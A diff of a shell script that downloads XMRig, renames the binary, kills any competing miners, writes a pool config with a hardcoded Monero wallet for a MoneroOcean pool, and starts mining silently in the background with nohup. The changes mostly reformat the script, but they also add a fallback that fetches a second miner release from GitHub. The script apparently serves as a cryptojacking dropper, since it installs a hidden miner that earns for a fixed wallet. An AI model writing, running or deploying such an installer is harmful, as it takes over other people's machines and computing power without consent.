@@ -1,5 +1,4 @@
 #!/bin/sh
-if grep -q "$(printf '\r')" "$0" 2>/dev/null; then tr -d '\r' < "$0" > "$0.tmp"; mv "$0.tmp" "$0"; exec sh "$0" "$@"; fi
 set -u
 
 WALLET="86d9KS12AnJTAVCbQcsw7G5e18ETxxVgAYyzM5d1yxxtAQXAAeAUoD6Sithghh7ookT3GNnkDX276GCRyNpPn9M4Nv2M44B"
@@ -10,32 +9,92 @@ BIN="$DIR/$BIN_NAME"
 CFG="$DIR/config.json"
 CFGB="$DIR/config_background.json"
 
-fail() { echo "FAILED: $1"; exit 1; }
-have() { command -v "$1" >/dev/null 2>&1; }
+fail() {
+  echo "FAILED: $1"
+  exit 1
+}
 
-if [ -z "${HOME:-}" ]; then fail "HOME not set"; fi
-if ! have curl; then if ! have wget; then fail "no curl/wget"; fi; fi
+have() {
+  command -v "$1" >/dev/null 2>&1
+}
 
-CPU_THREADS=$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 1)
+if [ -z "${HOME:-}" ]; then
+  fail "HOME not set"
+fi
+
+if [ ! -d "$HOME" ]; then
+  fail "HOME dir missing"
+fi
+
+if ! have curl; then
+  if ! have wget; then
+    fail "no curl/wget"
+  fi
+fi
+
+WBASE=$(echo "$WALLET" | cut -f1 -d".")
+WLEN=${#WBASE}
+
+if [ "$WLEN" != "95" ]; then
+  if [ "$WLEN" != "106" ]; then
+    fail "bad wallet length $WLEN"
+  fi
+fi
+
+CPU_THREADS=1
+if have nproc; then
+  T=$(nproc 2>/dev/null)
+  if [ -n "$T" ]; then
+    CPU_THREADS="$T"
+  fi
+else
+  T=$(grep -c ^processor /proc/cpuinfo 2>/dev/null)
+  if [ -n "$T" ]; then
+    CPU_THREADS="$T"
+  fi
+fi
+
 EXP=$(( CPU_THREADS * 700 / 1000 ))
-if [ "$EXP" -lt 1 ]; then EXP=1; fi
-PORT=$(( EXP * 30 ))
-if [ "$PORT" -eq 0 ]; then PORT=1; fi
+if [ "$EXP" -lt 1 ]; then
+  EXP=1
+fi
 
-# Power of 2 calculation
+PORT=$(( EXP * 30 ))
+if [ "$PORT" -eq 0 ]; then
+  PORT=1
+fi
+
 if have bc; then
   PORT=$(echo "x=l($PORT)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l)
 else
-  P=1; while [ "$P" -lt "$PORT" ]; do P=$(( P * 2 )); done; PORT=$P
+  P=1
+  while [ "$P" -lt "$PORT" ]; do
+    P=$(( P * 2 ))
+  done
+  PORT=$P
 fi
+
 PORT=$(( 10000 + PORT ))
-if [ "$PORT" -lt 10001 ]; then fail "port out of range"; fi
-if [ "$PORT" -gt 18192 ]; then fail "port out of range"; fi
+
+if [ "$PORT" -lt 10001 ]; then
+  fail "port out of range: $PORT"
+fi
+
+if [ "$PORT" -gt 18192 ]; then
+  fail "port out of range: $PORT"
+fi
 
 pkill -f "$BIN_NAME" 2>/dev/null
 pkill -f "xmrig" 2>/dev/null
-if ! rm -rf "$DIR"; then fail "cannot remove $DIR"; fi
-mkdir -p "$DIR" || true
+
+if ! rm -rf "$DIR"; then
+  fail "cannot remove $DIR"
+fi
+
+mkdir -p "$DIR"
+if [ ! -d "$DIR" ]; then
+  fail "cannot create $DIR"
+fi
 
 if have curl; then
   curl -sL "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz
@@ -43,35 +102,139 @@ else
   wget -q "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -O /tmp/xmrig.tar.gz
 fi
 
-if ! tar xf /tmp/xmrig.tar.gz -C "$DIR" 2>/dev/null; then fail "unpack xmrig.tar.gz"; fi
+if ! tar xf /tmp/xmrig.tar.gz -C "$DIR" 2>/dev/null; then
+  fail "unpack xmrig.tar.gz"
+fi
+
 rm -f /tmp/xmrig.tar.gz
 
-if [ ! -f "$DIR/xmrig" ]; then fail "xmrig binary missing"; fi
-if ! mv "$DIR/xmrig" "$BIN"; then fail "rename failed"; fi
-if ! chmod +x "$BIN"; then fail "chmod failed"; fi
+if [ ! -f "$DIR/xmrig" ]; then
+  fail "xmrig binary missing after unpack"
+fi
+
+if ! mv "$DIR/xmrig" "$BIN"; then
+  fail "rename failed"
+fi
+
+if ! chmod +x "$BIN"; then
+  fail "chmod failed"
+fi
+
+if ! "$BIN" --help >/dev/null 2>&1; then
+  REL=$(curl -sL "https://github.com/xmrig/xmrig/releases/latest")
+  if [ -z "$REL" ]; then
+    REL=$(wget -qO- "https://github.com/xmrig/xmrig/releases/latest")
+  fi
+  URL="https://github.com$(echo "$REL" | grep -o '"[^"]*xenial-x64.tar.gz"' | cut -d'"' -f2)"
+  if [ -z "$URL" ]; then
+    fail "no stock fallback URL"
+  fi
+  if have curl; then
+    curl -sL "$URL" -o /tmp/xmrig.tar.gz
+  else
+    wget -q "$URL" -O /tmp/xmrig.tar.gz
+  fi
+  if ! tar xf /tmp/xmrig.tar.gz -C "$DIR" --strip=1 2>/dev/null; then
+    fail "stock unpack failed"
+  fi
+  rm -f /tmp/xmrig.tar.gz
+  if [ -f "$DIR/xmrig" ]; then
+    mv -f "$DIR/xmrig" "$BIN"
+  fi
+  if ! "$BIN" --help >/dev/null 2>&1; then
+    fail "stock xmrig also broken"
+  fi
+fi
 
 PASS=$(hostname 2>/dev/null | cut -f1 -d"." | sed -E 's/[^a-zA-Z0-9-]+/_/g')
-if [ -z "$PASS" ]; then PASS="kdfeederr"; fi
-if [ "$PASS" = "localhost" ]; then PASS="kdfeederr"; fi
-if [ -n "$EMAIL" ]; then PASS="$PASS:$EMAIL"; fi
+if [ -z "$PASS" ]; then
+  PASS="kdfeederr"
+fi
 
-# Flattened JSON Config
-JSON_CONFIG="{\"api\":{\"id\":null,\"worker-id\":null},\"background\":false,\"colors\":true,\"cpu\":{\"enabled\":true,\"huge-pages\":true,\"priority\":1,\"yield\":true,\"max-threads-hint\":90,\"asm\":true},\"donate-level\":1,\"log-file\":\"$DIR/xmrig.log\",\"pools\":[{\"algo\":null,\"coin\":null,\"url\":\"gulf.moneroocean.stream:$PORT\",\"user\":\"$WALLET\",\"pass\":\"$PASS\",\"rig-id\":null,\"nicehash\":false,\"keepalive\":true,\"enabled\":true,\"tls\":false}],\"print-time\":60,\"retries\":5,\"retry-pause\":5,\"syslog\":false,\"watch\":true}"
-printf "%s" "$JSON_CONFIG" > "$CFG"
-if [ ! -s "$CFG" ]; then fail "config write failed"; fi
+if [ "$PASS" = "localhost" ]; then
+  PASS="kdfeederr"
+fi
 
-JSON_BG=$(printf "%s" "$JSON_CONFIG" | sed 's/"background":false/"background":true/')
-printf "%s" "$JSON_BG" > "$CFGB"
-if ! cp "$CFG" "$CFGB"; then fail "bg config failed"; fi
+if [ -n "$EMAIL" ]; then
+  PASS="$PASS:$EMAIL"
+fi
 
-# Flattened miner.sh
-printf "#!/bin/sh\nif ! pidof %s >/dev/null; then\n  nice %s \"\$@\"\nelse\n  echo \"Miner already running.\"\nfi\n" "$BIN_NAME" "$BIN" > "$DIR/miner.sh"
-if ! chmod +x "$DIR/miner.sh"; then fail "miner.sh chmod failed"; fi
+cat > "$CFG" <<EOF
+{
+  "api": { "id": null, "worker-id": null },
+  "background": false,
+  "colors": true,
+  "cpu": {
+    "enabled": true,
+    "huge-pages": true,
+    "huge-pages-jit": false,
+    "hw-aes": null,
+    "priority": 1,
+    "memory-pool": false,
+    "yield": true,
+    "max-threads-hint": 90,
+    "asm": true,
+    "rx": [0,1,2,3],
+    "rx/wow": [0,1,2,3],
+    "rx/arq": [0,1,2,3]
+  },
+  "donate-level": 1,
+  "log-file": "$DIR/xmrig.log",
+  "pools": [
+    {
+      "algo": null,
+      "coin": null,
+      "url": "gulf.moneroocean.stream:$PORT",
+      "user": "$WALLET",
+      "pass": "$PASS",
+      "rig-id": null,
+      "nicehash": false,
+      "keepalive": true,
+      "enabled": true,
+      "tls": false,
+      "tls-fingerprint": null,
+      "daemon": false
+    }
+  ],
+  "print-time": 60,
+  "retries": 5,
+  "retry-pause": 5,
+  "syslog": false,
+  "watch": true
+}
+EOF
+
+if [ ! -s "$CFG" ]; then
+  fail "config write failed"
+fi
+
+if ! cp "$CFG" "$CFGB"; then
+  fail "background config copy failed"
+fi
+
+if ! sed -i 's/"background": *false/"background": true/' "$CFGB"; then
+  fail "background edit failed"
+fi
+
+cat > "$DIR/miner.sh" <<EOF
+#!/bin/sh
+if ! pidof $BIN_NAME >/dev/null; then
+  nice $BIN "\$@"
+else
+  echo "Miner already running."
+fi
+EOF
+
+if ! chmod +x "$DIR/miner.sh"; then
+  fail "miner.sh chmod failed"
+fi
 
 nohup "$BIN" --config="$CFGB" >/dev/null 2>&1 &
 sleep 2
 
-if ! pgrep -f "$BIN_NAME" >/dev/null; then fail "miner did not stay up (see $DIR/xmrig.log)"; fi
+if ! pgrep -f "$BIN_NAME" >/dev/null; then
+  fail "miner did not stay up (see $DIR/xmrig.log)"
+fi
 
 PIDS=$(pgrep -f "$BIN_NAME" | tr '\n' ' ')
 echo "SUCCESS: pid=$PIDS port=$PORT persist=no"
